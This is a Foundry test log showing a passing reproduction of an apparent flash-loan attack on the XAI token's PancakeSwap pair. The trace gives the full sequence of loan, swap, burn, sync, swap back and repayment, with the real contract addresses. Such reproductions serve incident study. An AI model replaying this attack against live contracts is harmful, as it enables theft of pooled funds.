Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.30s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-11/XAI_exp.sol:26:5:
   |
26 |     IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 253.28ms (110.85µs CPU time)

Ran 1 test for src/test/2023-11/XAI_exp.sol:XAIExploit
[PASS] testExploit() (gas: 421625)
Logs:
  Exploiter WBNB balance before attack: 0.000000000000000000
  Exploiter WBNB balance after attack: 0.530802178153884369

Traces:
  [455525] XAIExploit::testExploit()
    ├─ [2534] WBNB::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2444] WBNB::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter WBNB balance before attack", val: 0, decimals: 18)
    ├─ [25295] XAI::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [2534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   └─ ← [Return] 2562001604398998683661 [2.562e21]
    ├─ [406204] DPPOracle::flashLoan(2562001604398998683661 [2.562e21], 0, XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5f)
    │   ├─ [25962] WBNB::transfer(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2562001604398998683661 [2.562e21])
    │   │   ├─ emit Transfer(from: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], to: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2562001604398998683661 [2.562e21])
    │   │   └─ ← [Return] true
    │   ├─ [353899] XAIExploit::DPPFlashLoanCall(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2562001604398998683661 [2.562e21], 0, 0x5f)
    │   │   ├─ [24420] WBNB::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WBNB::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 2562001604398998683661 [2.562e21]
    │   │   ├─ [207167] PancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(2562001604398998683661 [2.562e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x570Ce7b89c67200721406525e1848bca6fF5A6F3], XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1700019887 [1.7e9])
    │   │   │   ├─ [8225] WBNB::transferFrom(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], 2562001604398998683661 [2.562e21])
    │   │   │   │   ├─ emit Transfer(from: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], value: 2562001604398998683661 [2.562e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [13241] XAI::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2893] XAI_WBNB::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 100000000000000000000000000000 [1e29], 1090000000000000000 [1.09e18], 1700018878 [1.7e9]
    │   │   │   ├─ [534] WBNB::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   └─ ← [Return] 2563091604398998683661 [2.563e21]
    │   │   │   ├─ [169341] XAI_WBNB::swap(99957366694852838737841696701 [9.995e28], 0, XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [98057] XAI::transfer(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99957366694852838737841696701 [9.995e28])
    │   │   │   │   │   ├─ emit Transfer(from: XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], to: 0xb9534Bca0c4660Ce085F2EfB2A6cDd73bA6FDA74, value: 999573666948528387378416967 [9.995e26])
    │   │   │   │   │   ├─ emit Transfer(from: XAI: [0x570Ce7b89c67200721406525e1848bca6fF5A6F3], to: 0x0000000000000000000000000000000000000000, value: 0)
    │   │   │   │   │   ├─ emit Transfer(from: XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], to: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 97958219360955781963084862767 [9.795e28])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [3241] XAI::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 43502994093751897288319708 [4.35e25]
    │   │   │   │   ├─ [534] WBNB::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2563091604398998683661 [2.563e21]
    │   │   │   │   ├─ emit Sync(reserve0: 43502994093751897288319708 [4.35e25], reserve1: 2563091604398998683661 [2.563e21])
    │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 869688946590635130016409 [8.696e23], amount1In: 2562001604398998683661 [2.562e21], amount0Out: 99957366694852838737841696701 [9.995e28], amount1Out: 0, to: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [3241] XAI::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 99956497005906248102711680291 [9.995e28]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [550] XAI::totalSupply() [staticcall]
    │   │   │   └─ ← [Return] 100000000000000000000000000000 [1e29]
    │   │   ├─ [6920] XAI::burn(99999999999999999999999995404 [9.999e28])
    │   │   │   ├─ emit Transfer(from: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 99999999999999999999999995404 [9.999e28])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [11687] XAI_WBNB::sync()
    │   │   │   ├─ [3241] XAI::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [534] WBNB::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   └─ ← [Return] 2563091604398998683661 [2.563e21]
    │   │   │   ├─ emit Sync(reserve0: 1, reserve1: 2563091604398998683661 [2.563e21])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3241] XAI::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 4594
    │   │   ├─ [87931] PancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(4594, 0, [0x570Ce7b89c67200721406525e1848bca6fF5A6F3, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1700019887 [1.7e9])
    │   │   │   ├─ [34622] XAI::transferFrom(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], 4594)
    │   │   │   │   ├─ emit Transfer(from: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb9534Bca0c4660Ce085F2EfB2A6cDd73bA6FDA74, value: 45)
    │   │   │   │   ├─ emit Transfer(from: XAI: [0x570Ce7b89c67200721406525e1848bca6fF5A6F3], to: 0x0000000000000000000000000000000000000000, value: 0)
    │   │   │   │   ├─ emit Transfer(from: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], value: 4504)
    │   │   │   │   ├─ emit Approval(owner: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129635341 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [893] XAI_WBNB::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 1, 2563091604398998683661 [2.563e21], 1700018887 [1.7e9]
    │   │   │   ├─ [3241] XAI::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   └─ ← [Return] 4595
    │   │   │   ├─ [40965] XAI_WBNB::swap(0, 2562532406577152568030 [2.562e21], XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [23162] WBNB::transfer(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2562532406577152568030 [2.562e21])
    │   │   │   │   │   ├─ emit Transfer(from: XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], to: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2562532406577152568030 [2.562e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [3241] XAI::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 4595
    │   │   │   │   ├─ [534] WBNB::balanceOf(XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 559197821846115631 [5.591e17]
    │   │   │   │   ├─ emit Sync(reserve0: 4595, reserve1: 559197821846115631 [5.591e17])
    │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 4594, amount1In: 0, amount0Out: 0, amount1Out: 2562532406577152568030 [2.562e21], to: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [534] WBNB::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 2562532406577152568030 [2.562e21]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3262] WBNB::transfer(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 2562001604398998683661 [2.562e21])
    │   │   │   ├─ emit Transfer(from: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], value: 2562001604398998683661 [2.562e21])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 2562001604398998683661 [2.562e21]
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 3408695997235812889583 [3.408e21]
    │   ├─ [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 2562001604398998683661 [2.562e21]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 3408695997235812889583 [3.408e21]
    │   ├─ emit DODOFlashLoan(: XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 2562001604398998683661 [2.562e21], : 0)
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 530802178153884369 [5.308e17]
    ├─ [444] WBNB::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter WBNB balance after attack", val: 530802178153884369 [5.308e17], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 358.28ms (2.34ms CPU time)

Ran 2 test suites in 359.45ms (611.57ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
